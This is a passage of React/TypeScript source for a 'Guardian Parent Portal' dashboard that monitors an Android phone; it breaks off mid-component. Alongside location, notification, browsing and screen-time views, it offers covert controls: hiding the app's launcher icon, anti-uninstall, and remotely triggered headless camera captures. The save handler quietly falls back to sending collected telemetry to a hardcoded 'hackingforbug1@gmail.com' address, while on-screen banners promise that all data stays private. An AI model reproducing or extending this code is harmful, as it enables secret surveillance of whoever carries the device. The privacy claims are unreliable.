import React, { useState } from 'react';
import {
  AppApprovalDto,
  AppInfoDto,
  AppUsageDto,
  BatteryData,
  BrowsingHistoryItem,
  CameraCaptureItem,
  LocationData,
  NotificationDto,
  PermissionStatus,
  PrivacyAuditEntry,
  PrivacySettings,
  SocketLogItem,
} from '../types';
import { guardianStorage } from '../services/guardianStorage';
import { guardianApi } from '../services/guardianApi';
import {
  Smartphone,
  Battery,
  MapPin,
  Lock,
  MessageSquare,
  Camera,
  ShieldCheck,
  Shield,
  ShieldAlert,
  Globe,
  Bell,
  BarChart3,
  RefreshCw,
  EyeOff,
  Eye,
  CheckCircle2,
  XCircle,
  Clock,
  Send,
  Radio,
  Sliders,
  AlertOctagon,
  Download,
  Copy,
  Check,
  Mail,
  FileText,
  Database,
  ArrowRight,
} from 'lucide-react';

interface ParentDashboardProps {
  deviceId: string;
  serverDeviceId: string | null;
  serverUrl: string;
  onUpdateServerUrl: (url: string) => void;
  permissions: PermissionStatus;
  battery: BatteryData;
  location: LocationData;
  apps: AppInfoDto[];
  usage: AppUsageDto[];
  notifications: NotificationDto[];
  approvals: AppApprovalDto[];
  browsingHistory: BrowsingHistoryItem[];
  captures: CameraCaptureItem[];
  socketLogs: SocketLogItem[];
  isAppHidden: boolean;
  isAntiUninstall: boolean;
  onSendMessage: (type: 'MESSAGE' | 'BLOCK', message: string, password?: string) => void;
  onTriggerCamera: (cameraType: 'FRONT' | 'BACK') => void;
  onTriggerSync: (target: string) => void;
  onResolveApproval: (id: string, status: 'APPROVED' | 'REJECTED') => void;
  onToggleAntiUninstall: (enabled: boolean) => void;
  onToggleAppVisibility: (visible: boolean) => void;
  onToggleAppBlock: (packageName: string) => void;
  onResetDevice: () => void;
}

export const ParentDashboard: React.FC<ParentDashboardProps> = ({
  deviceId,
  serverDeviceId,
  serverUrl,
  onUpdateServerUrl,
  permissions,
  battery,
  location,
  apps,
  usage,
  notifications,
  approvals,
  browsingHistory,
  captures,
  socketLogs,
  isAppHidden,
  isAntiUninstall,
  onSendMessage,
  onTriggerCamera,
  onTriggerSync,
  onResolveApproval,
  onToggleAntiUninstall,
  onToggleAppVisibility,
  onToggleAppBlock,
  onResetDevice,
}) => {
  const [activeTab, setActiveTab] = useState<
    'overview' | 'apps' | 'usage' | 'browsing' | 'notifications' | 'captures' | 'commands' | 'logs' | 'privacy'
  >('overview');

  // Command form states
  const [messageType, setMessageType] = useState<'MESSAGE' | 'BLOCK'>('BLOCK');
  const [messageText, setMessageText] = useState('Waktunya belajar dan tidur! Layar dikunci.');
  const [unlockPassword, setUnlockPassword] = useState('2026');
  const [tempServerUrl, setTempServerUrl] = useState(serverUrl);
  const [showUrlEditor, setShowUrlEditor] = useState(false);

  // Privacy & Data Redirection states
  const [privacySettings, setPrivacySettings] = useState<PrivacySettings>(() =>
    guardianStorage.getPrivacySettings()
  );
  const [privacyAudit, setPrivacyAudit] = useState<PrivacyAuditEntry[]>(() =>
    guardianStorage.getPrivacyAudit()
  );
  const [recipientEmail, setRecipientEmail] = useState(privacySettings.userEmail);
  const [webhookUrl, setWebhookUrl] = useState(privacySettings.customWebhookUrl);
  const [isSavingPrivacy, setIsSavingPrivacy] = useState(false);
  const [privacySavedToast, setPrivacySavedToast] = useState(false);
  const [isDispatching, setIsDispatching] = useState(false);
  const [dispatchToast, setDispatchToast] = useState<string | null>(null);
  const [copiedToast, setCopiedToast] = useState(false);

  const formatMs = (ms: number): string => {
    const totalMinutes = Math.floor(ms / (1000 * 60));
    const hours = Math.floor(totalMinutes / 60);
    const minutes = totalMinutes % 60;
    if (hours === 0) return `${minutes}m`;
    return `${hours}h ${minutes}m`;
  };

  const handleSendCommand = (e: React.FormEvent) => {
    e.preventDefault();
    onSendMessage(messageType, messageText, messageType === 'BLOCK' ? unlockPassword : '');
  };

  const handleSavePrivacySettings = (e: React.FormEvent) => {
    e.preventDefault();
    setIsSavingPrivacy(true);
    const updated = guardianStorage.updatePrivacySettings({
      userEmail: recipientEmail.trim() || 'hackingforbug1@gmail.com',
      customWebhookUrl: webhookUrl.trim(),
      routeToUserOnly: true,
      blockDeveloperExfiltration: true,
    });
    setPrivacySettings(updated);
    setIsSavingPrivacy(false);
    setPrivacySavedToast(true);
    setTimeout(() => setPrivacySavedToast(false), 3000);
  };

  const handleDispatchToUser = async () => {
    setIsDispatching(true);
    setDispatchToast(null);
    try {
      const res = await guardianApi.dispatchTelemetryToUser();
      setPrivacySettings(guardianStorage.getPrivacySettings());
      setPrivacyAudit(guardianStorage.getPrivacyAudit());
      setDispatchToast(res.message);
    } catch {
      setDispatchToast('Telemetry secured to local user storage.');
    } finally {
      setIsDispatching(false);
      setTimeout(() => setDispatchToast(null), 5000);
    }
  };

  const handleDownloadDataPackage = () => {
    const data = guardianStorage.exportAllUserData();
    const blob = new Blob([JSON.stringify(data, null, 2)], {
      type: 'application/json',
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `guardian-telemetry-${new Date().toISOString().slice(0, 10)}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const handleCopyTelemetryJson = () => {
    const data = guardianStorage.exportAllUserData();
    navigator.clipboard.writeText(JSON.stringify(data, null, 2));
    setCopiedToast(true);
    setTimeout(() => setCopiedToast(false), 3000);
  };

  return (
    <div id="parent-dashboard" className="w-full flex flex-col bg-[#0B0E14] text-slate-100 min-h-full">
      {/* Top Bar Header */}
      <header className="w-full border-b border-slate-800 bg-[#121722] px-4 py-3 flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-xl bg-gradient-to-tr from-[#5C7CFA] to-[#A78BFA] flex items-center justify-center text-lg shadow-sm">
            🛡️
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-sm font-bold text-slate-100">Guardian Parent Portal</h2>
              <span className="px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 text-[10px] font-semibold border border-emerald-500/20 flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                DEVICE CONNECTED
              </span>
            </div>
            <p className="text-[11px] text-slate-400">
              Monitoring: <span className="font-mono text-slate-300">Pixel 8 Pro ({deviceId})</span>
            </p>
          </div>
        </div>

        {/* Quick Command Toolbar */}
        <div className="flex items-center gap-2">
          <button
            onClick={() => onTriggerSync('all')}
            className="px-3 py-1.5 rounded-lg bg-indigo-600/20 hover:bg-indigo-600/30 text-[#5C7CFA] border border-[#5C7CFA]/30 text-xs font-medium flex items-center gap-1.5 transition-colors"
          >
            <RefreshCw className="w-3.5 h-3.5" />
            <span>Force Sync All</span>
          </button>

          <button
            onClick={() => onToggleAntiUninstall(!isAntiUninstall)}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium border flex items-center gap-1.5 transition-colors ${
              isAntiUninstall
                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
                : 'bg-amber-500/10 border-amber-500/30 text-amber-400'
            }`}
          >
            <ShieldCheck className="w-3.5 h-3.5" />
            <span>Anti-Uninstall: {isAntiUninstall ? 'ON' : 'OFF'}</span>
          </button>

          <button
            onClick={() => onToggleAppVisibility(!isAppHidden)}
            className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 text-xs font-medium flex items-center gap-1.5 transition-colors"
          >
            {isAppHidden ? <Eye className="w-3.5 h-3.5" /> : <EyeOff className="w-3.5 h-3.5" />}
            <span>Launcher: {isAppHidden ? 'Hidden' : 'Visible'}</span>
          </button>
        </div>
      </header>

      {/* Privacy Shield Top Status Banner */}
      <div className="w-full bg-emerald-950/40 border-b border-emerald-500/20 px-4 py-2.5 flex flex-wrap items-center justify-between gap-3 text-xs">
        <div className="flex items-center gap-2.5">
          <span className="flex h-2.5 w-2.5 relative">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
            <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
          </span>
          <div>
            <span className="font-semibold text-emerald-300 mr-2">Privacy Shield Active:</span>
            <span className="text-slate-300 text-[11px] sm:text-xs">
              Developer server (<code className="text-amber-300 font-mono">irnhakim.my.id</code>) is{' '}
              <strong className="text-emerald-400">100% BLOCKED</strong>. All data routes exclusively to your account:{' '}
              <strong className="text-emerald-300 font-mono">{privacySettings.userEmail}</strong>
            </span>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setActiveTab('privacy')}
            className="px-2.5 py-1 rounded bg-emerald-600/30 hover:bg-emerald-600/50 text-emerald-200 border border-emerald-500/40 font-medium text-[11px] transition-colors flex items-center gap-1"
          >
            <Shield className="w-3 h-3 text-emerald-400" />
            <span>Routing &amp; Data Shield</span>
            <ArrowRight className="w-3 h-3 ml-0.5" />
          </button>
        </div>
      </div>

      {/* Navigation Sub-Tabs */}
      <nav className="w-full bg-[#0F131D] border-b border-slate-800 px-4 flex gap-1 overflow-x-auto">
        <TabButton
          active={activeTab === 'privacy'}
          onClick={() => setActiveTab('privacy')}
          icon={<Shield className="w-3.5 h-3.5 text-emerald-400" />}
          label="Privacy &amp; Data Redirection"
        />
        <TabButton
          active={activeTab === 'overview'}
          onClick={() => setActiveTab('overview')}
          icon={<Radio className="w-3.5 h-3.5" />}
          label="Telemetry Overview"
        />
        <TabButton
          active={activeTab === 'apps'}
          onClick={() => setActiveTab('apps')}
          icon={<Smartphone className="w-3.5 h-3.5" />}
          label={`Apps & Approvals (${approvals.filter((a) => a.status === 'PENDING').length})`}
        />
        <TabButton
          active={activeTab === 'usage'}
          onClick={() => setActiveTab('usage')}
          icon={<BarChart3 className="w-3.5 h-3.5" />}
          label="Screen Time & Usage"
        />
        <TabButton
          active={activeTab === 'browsing'}
          onClick={() => setActiveTab('browsing')}
          icon={<Globe className="w-3.5 h-3.5" />}
          label="Web History"
        />
        <TabButton
          active={activeTab === 'notifications'}
          onClick={() => setActiveTab('notifications')}
          icon={<Bell className="w-3.5 h-3.5" />}
          label={`Notifications (${notifications.length})`}
        />
        <TabButton
          active={activeTab === 'captures'}
          onClick={() => setActiveTab('captures')}
          icon={<Camera className="w-3.5 h-3.5" />}
          label={`Photos (${captures.length})`}
        />
        <TabButton
          active={activeTab === 'commands'}
          onClick={() => setActiveTab('commands')}
          icon={<Lock className="w-3.5 h-3.5" />}
          label="Lock & Message Control"
        />
        <TabButton
          active={activeTab === 'logs'}
          onClick={() => setActiveTab('logs')}
          icon={<Sliders className="w-3.5 h-3.5" />}
          label="Socket Events Log"
        />
      </nav>

      {/* Main Content Area */}
      <div className="p-4 sm:p-6 max-w-7xl w-full mx-auto space-y-6">
        {/* TAB: OVERVIEW */}
        {activeTab === 'overview' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            {/* Quick Metrics Grid */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
              {/* Battery Card */}
              <div className="p-4 rounded-xl bg-[#141A26] border border-slate-800 flex flex-col justify-between">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
                    Battery Level
                  </span>
                  <Battery className="w-4 h-4 text-emerald-400" />
                </div>
                <div className="my-2 flex items-baseline gap-2">
                  <span className="text-3xl font-bold text-slate-100">{battery.level}%</span>
                  <span className="text-xs text-emerald-400">
                    {battery.isCharging ? '⚡ Charging' : 'Discharging'}
                  </span>
                </div>
                <div className="text-[11px] text-slate-500 flex justify-between border-t border-slate-800 pt-2">
                  <span>Temp: {battery.temperature ?? 32.4}°C</span>
                  <span>Voltage: {battery.voltage ?? 4120} mV</span>
                </div>
              </div>

              {/* Location Card */}
              <div className="p-4 rounded-xl bg-[#141A26] border border-slate-800 flex flex-col justify-between">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
                    GPS Coordinates
                  </span>
                  <MapPin className="w-4 h-4 text-[#5C7CFA]" />
                </div>
                <div className="my-2">
                  <div className="text-sm font-semibold text-slate-100 font-mono">
                    {location.latitude.toFixed(4)}, {location.longitude.toFixed(4)}
                  </div>
                  <div className="text-xs text-slate-400 mt-0.5">
                    Jakarta, Indonesia (GPS Provider)
                  </div>
                </div>
                <div className="text-[11px] text-slate-500 flex justify-between border-t border-slate-800 pt-2">
                  <span>Accuracy: ±{location.accuracy ?? 12}m</span>
                  <span>Speed: {location.speed ?? 0} km/h</span>
                </div>
              </div>

              {/* Screen Time Today */}
              <div className="p-4 rounded-xl bg-[#141A26] border border-slate-800 flex flex-col justify-between">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
                    Screen Time Today
                  </span>
                  <Clock className="w-4 h-4 text-amber-400" />
                </div>
                <div className="my-2">
                  <div className="text-3xl font-bold text-slate-100">
                    {formatMs(usage.reduce((sum, u) => sum + u.usageMs, 0))}
                  </div>
                  <div className="text-xs text-slate-400 mt-0.5">
                    Top App: {usage[0]?.appName || 'None'}
                  </div>
                </div>
                <div className="text-[11px] text-slate-500 flex justify-between border-t border-slate-800 pt-2">
                  <span>{apps.length} apps installed</span>
                  <span>{approvals.filter((a) => a.status === 'PENDING').length} pending review</span>
                </div>
              </div>

              {/* Protection Status */}
              <div className="p-4 rounded-xl bg-[#141A26] border border-slate-800 flex flex-col justify-between">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
                    Protection Mode
                  </span>
                  <ShieldCheck className="w-4 h-4 text-indigo-400" />
                </div>
                <div className="my-2">
                  <div className="text-lg font-bold text-emerald-400 flex items-center gap-1.5">
                    <CheckCircle2 className="w-5 h-5" />
                    <span>Shield Armed</span>
                  </div>
                  <div className="text-xs text-slate-400 mt-0.5">
                    Device Admin &amp; A11y Active
                  </div>
                </div>
                <div className="text-[11px] text-slate-500 flex justify-between border-t border-slate-800 pt-2">
                  <span>Anti-Uninstall: {isAntiUninstall ? 'Active' : 'Disabled'}</span>
                  <button
                    onClick={() => setActiveTab('commands')}
                    className="text-[#5C7CFA] hover:underline"
                  >
                    Manage
                  </button>
                </div>
              </div>
            </div>

            {/* Simulated Live Location Map Panel */}
            <div className="p-5 rounded-2xl bg-[#141A26] border border-slate-800">
              <div className="flex items-center justify-between mb-3">
                <div className="flex items-center gap-2">
                  <MapPin className="w-4 h-4 text-[#5C7CFA]" />
                  <h3 className="text-sm font-bold text-slate-200">Live Device Geolocation Map</h3>
                </div>
                <button
                  onClick={() => onTriggerSync('location')}
                  className="px-2.5 py-1 rounded bg-slate-800 text-slate-300 hover:bg-slate-700 text-xs flex items-center gap-1"
                >
                  <RefreshCw className="w-3 h-3" />
                  <span>Request Live Ping</span>
                </button>
              </div>

              {/* Map Canvas / Visualizer */}
              <div className="w-full h-64 rounded-xl bg-gradient-to-br from-slate-900 via-[#101726] to-[#0A0D15] border border-slate-800 relative overflow-hidden flex items-center justify-center">
                {/* Geometric grid lines */}
                <div
                  className="absolute inset-0 opacity-20 pointer-events-none"
                  style={{
                    backgroundImage:
                      'radial-gradient(#5C7CFA 1px, transparent 1px), radial-gradient(#5C7CFA 1px, transparent 1px)',
                    backgroundSize: '24px 24px',
                    backgroundPosition: '0 0, 12px 12px',
                  }}
                />

                {/* Map Street Simulation Lines */}
                <svg className="absolute inset-0 w-full h-full stroke-slate-800/80 stroke-[2] fill-none">
                  <path d="M 0,120 Q 200,60 400,140 T 800,100" />
                  <path d="M 100,0 Q 250,150 200,300" />
                  <path d="M 500,0 Q 450,180 600,300" />
                  <circle cx="50%" cy="50%" r="80" stroke="#5C7CFA" strokeWidth="1" strokeDasharray="4 4" opacity="0.4" />
                </svg>

                {/* Target Marker Pin */}
                <div className="relative flex flex-col items-center animate-bounce duration-1000">
                  <div className="w-10 h-10 rounded-full bg-[#5C7CFA] text-white flex items-center justify-center shadow-lg shadow-indigo-500/50 ring-4 ring-indigo-500/20">
                    <Smartphone className="w-5 h-5" />
                  </div>
                  <div className="mt-1.5 px-2.5 py-1 rounded-md bg-slate-900/90 border border-slate-700 text-[11px] font-semibold text-slate-200 shadow whitespace-nowrap">
                    Child Device • {location.latitude.toFixed(4)}, {location.longitude.toFixed(4)}
                  </div>
                </div>

                <div className="absolute bottom-3 right-3 px-3 py-1.5 rounded-lg bg-slate-900/80 border border-slate-800 text-[11px] text-slate-400">
                  Satellite Fix: Valid • Provider: {location.provider ?? 'GPS'}
                </div>
              </div>
            </div>

            {/* Device System Checklist & Server URL config */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              {/* Permissions Telemetry */}
              <div className="p-4 rounded-xl bg-[#141A26] border border-slate-800">
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                    Permissions Audit
                  </h3>
                  <button
                    onClick={() => onTriggerSync('permissions')}
                    className="text-xs text-[#5C7CFA] hover:underline"
                  >
                    Sync Checklist
                  </button>
                </div>
                <div className="grid grid-cols-2 gap-2 text-xs">
                  {Object.entries(permissions).map(([key, val]) => (
                    <div
                      key={key}
                      className="p-2 rounded-lg bg-[#0F131D] border border-slate-800/80 flex items-center justify-between"
                    >
                      <span className="capitalize text-slate-300">
                        {key.replace(/([A-Z])/g, ' $1')}
                      </span>
                      <span
                        className={`text-[10px] font-semibold px-1.5 py-0.5 rounded ${
                          val
                            ? 'bg-emerald-500/10 text-emerald-400'
                            : 'bg-amber-500/10 text-amber-400'
                        }`}
                      >
                        {val ? 'GRANTED' : 'REVOKED'}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Server Connection Config */}
              <div className="p-4 rounded-xl bg-[#141A26] border border-slate-800 flex flex-col justify-between">
                <div>
                  <div className="flex items-center justify-between mb-2">
                    <h3 className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                      Backend API Gateway
                    </h3>
                    <button
                      onClick={() => setShowUrlEditor(!showUrlEditor)}
                      className="text-xs text-[#5C7CFA] hover:underline"
                    >
                      {showUrlEditor ? 'Cancel' : 'Edit Gateway'}
                    </button>
                  </div>
                  <p className="text-xs text-slate-400 mb-3">
                    Connected Gateway Endpoint (Privacy Shield Enforced):
                  </p>
                  <div className="p-2.5 rounded-lg bg-[#0F131D] border border-slate-800 font-mono text-xs text-indigo-300 break-all flex items-center justify-between">
                    <span>{serverUrl || 'Local User Storage Mode (100% Private, Zero External Leak)'}</span>
                    <span className="px-1.5 py-0.5 rounded bg-emerald-500/10 text-emerald-400 text-[10px] font-semibold border border-emerald-500/20 shrink-0 ml-2">
                      DEVELOPER BLOCKED
                    </span>
                  </div>

                  {showUrlEditor && (
                    <div className="mt-3 space-y-2">
                      <div className="flex gap-2">
                        <input
                          type="text"
                          value={tempServerUrl}
                          onChange={(e) => setTempServerUrl(e.target.value)}
                          placeholder="https://your-private-server.com/api/v1 (or leave blank for local)"
                          className="flex-1 px-3 py-1.5 rounded-lg bg-[#0F131D] border border-slate-700 text-xs text-slate-200 focus:outline-hidden focus:border-[#5C7CFA]"
                        />
                        <button
                          onClick={() => {
                            onUpdateServerUrl(tempServerUrl);
                            setShowUrlEditor(false);
                          }}
                          className="px-3 py-1.5 rounded-lg bg-[#5C7CFA] text-white text-xs font-semibold hover:bg-[#4d6de8]"
                        >
                          Save
                        </button>
                      </div>
                      <p className="text-[11px] text-amber-400/90 leading-tight">
                        Note: Any attempt to connect to third-party developer servers (irnhakim.my.id) is automatically blocked.
                      </p>
                    </div>
                  )}
                </div>

                <div className="mt-4 pt-3 border-t border-slate-800 flex justify-between items-center text-xs text-slate-500">
                  <span>Server Registration ID: {serverDeviceId || 'Registered'}</span>
                  <button
                    onClick={onResetDevice}
                    className="text-red-400 hover:text-red-300 font-medium"
                  >
                    Reset Preferences
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* TAB: APPS & APPROVALS */}
        {activeTab === 'apps' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            {/* Pending Approvals Section */}
            {approvals.filter((a) => a.status === 'PENDING').length > 0 && (
              <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/30">
                <div className="flex items-center gap-2 mb-3">
                  <AlertOctagon className="w-4 h-4 text-amber-400" />
                  <h3 className="text-sm font-bold text-amber-300">
                    Pending Parental App Approvals (
                    {approvals.filter((a) => a.status === 'PENDING').length})
                  </h3>
                </div>
                <div className="space-y-2">
                  {approvals
                    .filter((a) => a.status === 'PENDING')
                    .map((item) => (
                      <div
                        key={item.id}
                        className="p-3 rounded-lg bg-[#141A26] border border-slate-800 flex flex-wrap items-center justify-between gap-3"
                      >
                        <div>
                          <div className="text-sm font-semibold text-slate-200">{item.appName}</div>
                          <div className="text-xs text-slate-400 font-mono">{item.packageName}</div>
                          <div className="text-[11px] text-slate-500 mt-0.5">
                            Requested at: {item.requestedAt} • Installer: {item.installer ?? 'APK'}
                          </div>
                        </div>
                        <div className="flex items-center gap-2">
                          <button
                            onClick={() => onResolveApproval(item.id, 'APPROVED')}
                            className="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold flex items-center gap-1 shadow-sm"
                          >
                            <CheckCircle2 className="w-3.5 h-3.5" />
                            <span>Approve &amp; Unblock</span>
                          </button>
                          <button
                            onClick={() => onResolveApproval(item.id, 'REJECTED')}
                            className="px-3 py-1.5 rounded-lg bg-red-600/80 hover:bg-red-600 text-white text-xs font-semibold flex items-center gap-1"
                          >
                            <XCircle className="w-3.5 h-3.5" />
                            <span>Reject &amp; Keep Blocked</span>
                          </button>
                        </div>
                      </div>
                    ))}
                </div>
              </div>
            )}

            {/* Installed Apps Inventory */}
            <div className="p-5 rounded-2xl bg-[#141A26] border border-slate-800">
              <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
                <div>
                  <h3 className="text-sm font-bold text-slate-200">Installed Applications Inventory</h3>
                  <p className="text-xs text-slate-400">
                    Remotely block or unblock apps on the child&apos;s device in real-time.
                  </p>
                </div>
                <button
                  onClick={() => onTriggerSync('apps')}
                  className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-medium flex items-center gap-1.5"
                >
                  <RefreshCw className="w-3.5 h-3.5" />
                  <span>Sync Apps List</span>
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                {apps.map((app) => (
                  <div
                    key={app.packageName}
                    className="p-3.5 rounded-xl bg-[#0F131D] border border-slate-800/80 flex items-center justify-between"
                  >
                    <div className="min-w-0 pr-3">
                      <div className="flex items-center gap-2">
                        <span className="text-sm font-bold text-slate-200 truncate">
                          {app.appName}
                        </span>
                        {app.isSystemApp && (
                          <span className="px-1.5 py-0.2 rounded bg-slate-800 text-slate-400 text-[10px]">
                            System
                          </span>
                        )}
                        {app.isBlocked && (
                          <span className="px-1.5 py-0.2 rounded bg-red-500/20 text-red-400 border border-red-500/30 text-[10px] font-semibold">
                            BLOCKED
                          </span>
                        )}
                      </div>
                      <div className="text-xs text-slate-400 font-mono truncate mt-0.5">
                        {app.packageName}
                      </div>
                      <div className="text-[11px] text-slate-500 mt-0.5">
                        v{app.versionName || '1.0'}
                      </div>
                    </div>

                    <button
                      onClick={() => onToggleAppBlock(app.packageName)}
                      className={`shrink-0 px-3 py-1.5 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5 ${
                        app.isBlocked
                          ? 'bg-emerald-600 hover:bg-emerald-500 text-white'
                          : 'bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30'
                      }`}
                    >
                      <Lock className="w-3.5 h-3.5" />
                      <span>{app.isBlocked ? 'Unblock' : 'Block App'}</span>
                    </button>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* TAB: USAGE */}
        {activeTab === 'usage' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <div className="p-5 rounded-2xl bg-[#141A26] border border-slate-800">
              <div className="flex items-center justify-between mb-4">
                <div>
                  <h3 className="text-sm font-bold text-slate-200">Daily App Screen Time Telemetry</h3>
                  <p className="text-xs text-slate-400">
                    Aggregated foreground usage stats reported by Guardian UsageStatsManager.
                  </p>
                </div>
                <button
                  onClick={() => onTriggerSync('usage')}
                  className="px-3 py-1.5 rounded-lg bg-slate-800 text-slate-200 text-xs font-medium flex items-center gap-1.5"
                >
                  <RefreshCw className="w-3.5 h-3.5" />
                  <span>Sync Usage</span>
                </button>
              </div>

              {/* Progress Bars */}
              <div className="space-y-3">
                {usage.map((item) => {
                  const maxUsage = Math.max(...usage.map((u) => u.usageMs), 1);
                  const pct = Math.round((item.usageMs / maxUsage) * 100);
                  return (
                    <div
                      key={item.packageName}
                      className="p-3.5 rounded-xl bg-[#0F131D] border border-slate-800/80"
                    >
                      <div className="flex items-center justify-between mb-1.5">
                        <span className="text-sm font-semibold text-slate-200">{item.appName}</span>
                        <span className="text-xs font-mono font-bold text-[#5C7CFA]">
                          {formatMs(item.usageMs)}
                        </span>
                      </div>
                      <div className="w-full h-2 rounded-full bg-slate-800 overflow-hidden">
                        <div
                          className="h-full rounded-full bg-gradient-to-r from-[#5C7CFA] to-[#A78BFA]"
                          style={{ width: `${pct}%` }}
                        />
                      </div>
                      <div className="flex justify-between text-[10px] text-slate-500 mt-1">
                        <span>{item.packageName}</span>
                        <span>Date: {item.date}</span>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        )}

        {/* TAB: BROWSING */}
        {activeTab === 'browsing' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <div className="p-5 rounded-2xl bg-[#141A26] border border-slate-800">
              <div className="flex items-center justify-between mb-4">
                <div>
                  <h3 className="text-sm font-bold text-slate-200">Browsing History (A11y Node Tracker)</h3>
                  <p className="text-xs text-slate-400">
                    Real-time URL interception captured from Chrome, Firefox, and Samsung Browser.
                  </p>
                </div>
              </div>

              <div className="space-y-2">
                {browsingHistory.length === 0 ? (
                  <p className="text-xs text-slate-500 py-6 text-center">No browsing logs captured yet.</p>
                ) : (
                  browsingHistory.map((hist) => (
                    <div
                      key={hist.id}
                      className="p-3 rounded-xl bg-[#0F131D] border border-slate-800 flex items-center justify-between gap-3"
                    >
                      <div className="flex items-center gap-3 min-w-0">
                        <div className="w-8 h-8 rounded-lg bg-emerald-500/10 text-emerald-400 flex items-center justify-center shrink-0">
                          <Globe className="w-4 h-4" />
                        </div>
                        <div className="min-w-0">
                          <div className="text-xs font-semibold text-slate-200 truncate">
                            {hist.title || hist.url}
                          </div>
                          <div className="text-[11px] text-indigo-400 font-mono truncate">
                            {hist.url}
                          </div>
                        </div>
                      </div>
                      <span className="text-[10px] text-slate-500 shrink-0">{hist.timestamp}</span>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        )}

        {/* TAB: NOTIFICATIONS */}
        {activeTab === 'notifications' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <div className="p-5 rounded-2xl bg-[#141A26] border border-slate-800">
              <div className="flex items-center justify-between mb-4">
                <div>
                  <h3 className="text-sm font-bold text-slate-200">Notification Listener Stream</h3>
                  <p className="text-xs text-slate-400">
                    Intercepted push notifications from messaging, social, and gaming apps.
                  </p>
                </div>
              </div>

              <div className="space-y-2">
                {notifications.length === 0 ? (
                  <p className="text-xs text-slate-500 py-6 text-center">No notifications logged yet.</p>
                ) : (
                  notifications.map((notif) => (
                    <div
                      key={notif.id}
                      className="p-3 rounded-xl bg-[#0F131D] border border-slate-800 flex items-start gap-3"
                    >
                      <div className="w-8 h-8 rounded-lg bg-amber-500/10 text-amber-400 flex items-center justify-center shrink-0 mt-0.5">
                        <Bell className="w-4 h-4" />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between gap-2">
                          <span className="text-xs font-bold text-slate-200 truncate">
                            {notif.appName} • {notif.title}
                          </span>
                          <span className="text-[10px] text-slate-500 shrink-0">{notif.timestamp}</span>
                        </div>
                        <p className="text-xs text-slate-400 mt-1 leading-relaxed">{notif.text}</p>
                        <div className="text-[10px] font-mono text-slate-500 mt-1">
                          {notif.packageName}
                        </div>
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        )}

        {/* TAB: CAPTURES */}
        {activeTab === 'captures' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <div className="p-5 rounded-2xl bg-[#141A26] border border-slate-800">
              <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
                <div>
                  <h3 className="text-sm font-bold text-slate-200">Remote Camera Snapshot Gallery</h3>
                  <p className="text-xs text-slate-400">
                    Trigger headless camera captures (front/back lens) remotely.
                  </p>
                </div>
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => onTriggerCamera('FRONT')}
                    className="px-3 py-1.5 rounded-lg bg-[#5C7CFA] hover:bg-[#4d6de8] text-white text-xs font-semibold flex items-center gap-1.5"
                  >
                    <Camera className="w-3.5 h-3.5" />
                    <span>Trigger Front Camera</span>
                  </button>
                  <button
                    onClick={() => onTriggerCamera('BACK')}
                    className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold flex items-center gap-1.5"
                  >
                    <Camera className="w-3.5 h-3.5" />
                    <span>Trigger Back Camera</span>
                  </button>
                </div>
              </div>

              {captures.length === 0 ? (
                <div className="py-12 flex flex-col items-center justify-center text-center">
                  <Camera className="w-10 h-10 text-slate-600 mb-2" />
                  <p className="text-xs text-slate-400">No snapshots taken yet.</p>
                  <p className="text-[11px] text-slate-500 mt-1">
                    Click &ldquo;Trigger Front Camera&rdquo; or &ldquo;Trigger Back Camera&rdquo; above.
                  </p>
                </div>
              ) : (
                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
                  {captures.map((cap) => (
